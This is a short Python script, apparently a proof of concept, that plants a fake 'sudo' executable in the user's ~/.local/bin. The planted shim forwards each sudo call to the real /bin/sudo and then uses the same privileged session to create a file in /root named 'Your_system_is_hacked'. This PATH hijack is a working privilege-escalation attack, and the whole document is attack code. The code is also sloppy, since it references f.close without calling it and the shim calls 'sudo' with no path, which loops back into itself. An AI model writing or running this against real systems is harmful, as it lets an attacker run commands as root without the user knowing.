import getpass
import os

f = open(f'/home/{getpass.getuser()}/.local/bin/sudo', 'w')
f.write("""#!/bin/python3
import sys
import os

arg = sys.argv[1:]

text = ''

for i in arg:
    text = text + i + ' '
if arg == []:
    os.system('sudo')
else:
    os.system(f'/bin/sudo {text} && /bin/sudo touch /root/Your_system_is_hacked')
""")
f.close

os.system(f'chmod +x /home/{getpass.getuser()}/.local/bin/sudo')
